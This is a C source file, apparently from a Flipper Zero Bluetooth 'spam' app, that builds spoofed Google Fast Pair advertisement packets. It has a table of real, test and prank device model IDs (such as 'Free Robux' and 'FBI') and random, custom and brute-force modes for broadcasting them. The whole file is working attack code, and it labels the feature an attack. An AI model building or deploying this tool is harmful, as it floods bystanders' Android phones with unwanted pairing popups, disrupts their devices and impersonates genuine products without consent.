#include "fastpair.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const struct {
    uint32_t value;
    const char* name;
} models[] = {
    // Genuine actions
    {0x00000C, "Set Up Device"},

    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0x00000A, "Anti-Spoof Test"},
    {0x0A0000, "Anti-Spoof Test 2"},
    {0x00000B, "Google Gphones"},
    {0x0B0000, "Google Gphones 2"},
    {0x0C0000, "Google Gphones 3"},
    {0x00000D, "Test 00000D"},
    {0x000007, "Android Auto"},
    {0x070000, "Android Auto 2"},
    {0x000008, "Foocorp Foophones"},
    {0x080000, "Foocorp Foophones 2"},
    {0x000009, "Test Android TV"},
    {0x090000, "Test Android TV 2"},
    {0x000048, "Fast Pair Headphones"},
    {0x000049, "Fast Pair Headphones 2"},

    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0x0000F0, "Bose QuietComfort 35 II"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x0002F0, "JBL Everest 110GA"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0x060000, "Google Pixel buds 2"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},
    {0x0003F0, "LG HBS-835S"},

    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0xF38C02, "Boykisser"},
    {0x1448C9, "BLM"},
    {0xD5AB33, "Xtreme"},
    {0x0C0B67, "Xtreme Cta"},
    {0x13B39D, "Talking Sasquach"},
    {0xAA1FE1, "ClownMaster"},
    {0x7C6CDB, "Obama"},
    {0x005EF9, "Ryanair"},
    {0xE2106F, "FBI"},
    {0xB37A62, "Tesla"},
};
const uint8_t models_count = COUNT_OF(models);

static const char* get_name(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return "FastPair";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, ProtocolCfg* _cfg) {
    FastpairCfg* cfg = _cfg ? &_cfg->specific.fastpair : NULL;

    uint32_t model;
    switch(cfg ? _cfg->mode : ProtocolModeRandom) {
    case ProtocolModeRandom:
    default:
        model = models[rand() % models_count].value;
        break;
    case ProtocolModeValue:
        model = cfg->model;
        break;
    case ProtocolModeBruteforce:
        model = cfg->model = _cfg->bruteforce.value;
        break;
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model >> 0x10) & 0xFF;
    packet[i++] = (model >> 0x08) & 0xFF;
    packet[i++] = (model >> 0x00) & 0xFF;

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigModel,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigModel:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModel);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void model_changed(VariableItem* item) {
    ProtocolCfg* _cfg = variable_item_get_context(item);
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        _cfg->mode = ProtocolModeValue;
        cfg->model = models[index].value;
        variable_item_set_current_value_text(item, models[index].name);
    } else {
        _cfg->mode = ProtocolModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    ProtocolCfg* _cfg = &ctx->attack->payload.cfg;
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    item = variable_item_list_add(list, "Model Code", models_count + 1, model_changed, _cfg);
    const char* model_name = NULL;
    char model_name_buf[9];
    switch(_cfg->mode) {
    case ProtocolModeRandom:
    default:
        model_name = "Random";
        value_index = 0;
        break;
    case ProtocolModeValue:
        for(uint8_t i = 0; i < models_count; i++) {
            if(cfg->model == models[i].value) {
                model_name = models[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!model_name) {
            snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->model);
            model_name = model_name_buf;
            value_index = models_count + 1;
        }
        break;
    case ProtocolModeBruteforce:
        model_name = "Bruteforce";
        value_index = models_count + 1;
        break;
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, model_name);

    variable_item_list_add(list, "Requires Google services", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_fastpair = {
    .icon = &I_android,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    ProtocolCfg* _cfg = &ctx->attack->payload.cfg;
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    switch(index) {
    case 0:
        _cfg->mode = ProtocolModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelCustom);
        break;
    case models_count + 2:
        _cfg->mode = ProtocolModeBruteforce;
        _cfg->bruteforce.counter = 0;
        _cfg->bruteforce.value = cfg->model;
        _cfg->bruteforce.size = 3;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        _cfg->mode = ProtocolModeValue;
        cfg->model = models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_fastpair_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    ProtocolCfg* _cfg = &ctx->attack->payload.cfg;
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, model_callback, ctx);
    if(_cfg->mode == ProtocolModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < models_count; i++) {
        submenu_add_item(submenu, models[i].name, i + 1, model_callback, ctx);
        if(!found && _cfg->mode == ProtocolModeValue && cfg->model == models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", models_count + 1, model_callback, ctx);
    if(!found && _cfg->mode == ProtocolModeValue) {
        selected = models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", models_count + 2, model_callback, ctx);
    if(_cfg->mode == ProtocolModeBruteforce) {
        selected = models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_fastpair_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    ProtocolCfg* _cfg = &ctx->attack->payload.cfg;
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    _cfg->mode = ProtocolModeValue;
    cfg->model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_fastpair_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    ProtocolCfg* _cfg = &ctx->attack->payload.cfg;
    FastpairCfg* cfg = &_cfg->specific.fastpair;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_fastpair_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
